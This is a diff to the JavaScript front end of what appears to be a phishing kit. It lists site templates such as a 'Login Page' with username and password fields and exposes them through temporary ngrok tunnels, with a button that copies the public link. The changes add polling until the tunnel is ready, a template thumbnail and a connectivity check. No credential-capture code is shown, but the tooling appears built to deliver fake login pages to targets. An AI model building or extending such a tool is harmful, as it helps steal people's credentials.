@@ -646,22 +646,77 @@ window.getNgrokLink = async (templateLink, btnElement) => {
     }
 
     const data = await resp.json();
-    ngrokUrl = data.url;
-    ngrokActive = true;
 
-    // Construct full link: ngrok URL + template path
-    const fullLink = ngrokUrl + '/' + templateLink;
-    copyToClipboard(fullLink);
+    // If tunnel is not ready yet (async start), poll until ready
+    if (!data.active && data.starting) {
+      toast('STARTING NGROK TUNNEL...', false);
+      
+      // Poll for tunnel to become active (max 45 seconds)
+      let attempts = 0;
+      const maxAttempts = 45;
+      
+      while (attempts < maxAttempts) {
+        await new Promise(r => setTimeout(r, 1000));
+        attempts++;
+        
+        const statusResp = await fetch('/api/ngrok/status');
+        if (statusResp.ok) {
+          const statusData = await statusResp.json();
+          if (statusData.active && statusData.url) {
+            ngrokUrl = statusData.url;
+            ngrokActive = true;
+            
+            // Construct full link: ngrok URL + template path
+            const fullLink = ngrokUrl + '/' + templateLink;
+            copyToClipboard(fullLink);
+            toast('LINK COPIED: ' + fullLink);
+            
+            startTimer(statusData.timeRemaining);
+            renderSites();
+            updateTimerDisplay(statusData.timeRemaining);
+            
+            if (btnElement) {
+              btnElement.disabled = false;
+              btnElement.textContent = 'REGENERATE LINK';
+            }
+            return;
+          }
+        }
+        
+        // Update button text to show progress
+        if (btnElement && attempts % 5 === 0) {
+          btnElement.textContent = `WAITING... (${attempts}s)`;
+        }
+      }
+      
+      // Timed out waiting
+      toast('TUNNEL START TIMEOUT - Check ngrok connection', true);
+      if (btnElement) {
+        btnElement.disabled = false;
+        btnElement.textContent = 'GET LINK';
+      }
+      return;
+    }
 
-    // Show in-app notification
-    toast('LINK COPIED: ' + fullLink);
+    // Tunnel was immediately ready
+    if (data.active && data.url) {
+      ngrokUrl = data.url;
+      ngrokActive = true;
 
-    // Start 15-minute timer
-    startTimer(data.timeRemaining);
+      const fullLink = ngrokUrl + '/' + templateLink;
+      copyToClipboard(fullLink);
+      toast('LINK COPIED: ' + fullLink);
 
-    // Update UI
-    renderSites();
-    updateTimerDisplay(data.timeRemaining);
+      startTimer(data.timeRemaining);
+      renderSites();
+      updateTimerDisplay(data.timeRemaining);
+    } else {
+      toast('NGROK NOT AVAILABLE', true);
+      if (btnElement) {
+        btnElement.disabled = false;
+        btnElement.textContent = 'GET LINK';
+      }
+    }
 
   } catch (e) {
     toast('NGROK START FAILED: ' + e.message, true);
@@ -710,6 +765,7 @@ const siteTemplates = [
   {
     name: "Login Page",
     desc: "Standard login page with username/email and password fields",
+    image: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='100%25' height='100%25' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23222'/%3E%3Ctext x='50' y='55' font-family='monospace' font-size='14' fill='%2300ff99' text-anchor='middle'%3ELOGIN%3C/text%3E%3C/svg%3E",
     tags: ["login", "standard"],
     link: "sites/login.html"
   },
@@ -759,10 +815,10 @@ window.renderSites = () => {
 
         <button
           class="site-btn"
-          onclick="getNgrokLink('${site.link}')"
-          ${ngrokActive ? 'style="border-color:var(--yellow);color:var(--yellow);"' : ''}
+          onclick="getNgrokLink('${site.link}', this)"
+          ${ngrokActive && ngrokUrl ? 'style="border-color:var(--yellow);color:var(--yellow);"' : ''}
         >
-          ${ngrokActive ? 'REGENERATE LINK' : 'GET LINK'}
+          ${ngrokActive && ngrokUrl ? 'REGENERATE LINK' : 'GET LINK'}
         </button>
 
       </div>
@@ -771,10 +827,30 @@ window.renderSites = () => {
   `).join('');
 };
 
+// Check ngrok connectivity
+async function checkNgrokConnectivity() {
+  try {
+    const resp = await fetch('/api/ngrok/check');
+    if (resp.ok) {
+      const data = await resp.json();
+      if (!data.api_reachable) {
+        console.warn('ngrok API not reachable:', data.message);
+        // Try to check if ngrok is authenticated by starting it
+        if (data.ngrok_installed) {
+          toast('NGROK READY - Click GET LINK to start', false);
+        }
+      }
+    }
+  } catch (e) {
+    console.warn('ngrok connectivity check failed:', e.message);
+  }
+}
+
 // render when opening page + poll ngrok status
 setTimeout(() => {
   if(document.getElementById('sitesGrid')){
     renderSites();
     pollNgrokStatus();
+    checkNgrokConnectivity();
   }
 }, 1000);
